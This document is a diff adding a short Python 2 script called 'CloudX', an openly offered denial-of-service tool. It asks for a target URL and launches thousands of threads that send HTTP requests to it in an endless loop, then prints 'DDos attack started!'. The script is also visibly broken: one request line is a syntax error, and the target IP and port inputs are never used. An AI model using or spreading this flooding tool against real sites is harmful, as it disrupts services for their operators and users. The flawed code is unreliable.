@@ -1,0 +1,63 @@
+#!/usr/bin/python                                        
+                                                         
+import threading                                         
+import sys                                               
+import urllib2                                           
+
+logo="""
+< =============== >
+      CloudX
+^ <=============> ^
+
+"""
+print(logo)
+
+# Variables                                              
+url = ""                                                 
+ip = ""                                                  
+port = ""                                                
+threads = ""                                             
+method = ""                                              
+maxThreads = int(20000)                                  
+                                                         
+# Get user input                                         
+url = raw_input("[+] Enter a URL to attack: ")           
+ip = raw_input("[+] Enter the target IP address: ")      
+port = raw_input("[+] Enter the target port (default: 80): ")                                                     
+numberOfThreads = raw_input("[+] Enter the desired number of threads (default: 16500): ")                         
+method = raw_input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")                     
+                                                         
+# Use default parameters if no input is given            
+if port == "":                                           
+    port = str(80)                                       
+if numberOfThreads == "":
+    numberOfThreads = int(16500)
+if maxThreads < numberOfThreads:
+    numberOfThreads = int(maxThreads)
+if method == "":
+    method = "GET"
+
+# Construct attack parameters
+headers = {
+'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
+'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+'Connection': 'close'
+}
+
+# Begin attack
+def attack(ip, port, threadNum):
+    request = urllib2.Request(url,None,headers)
+    while True:
+        try:
+            urlsocket file = urllib2.urlopen(request)
+            print "[*] Thread (%s) | Attack Sent!" % (threadNum)
+        except:
+            print "[*] Thread (%s) | URL or IP not valid!" % (threadNum)
+            print "[*] Thread (%s) | Attack stopped." % (threadNum)
+            break
+
+# Define threads
+for i in range(numberOfThreads):
+    threading.Thread(target=attack, args=(ip,port,i)).start()
+
+print "[+] DDos attack started! Enjoy your 'boom' responsibly! 💣🔥"
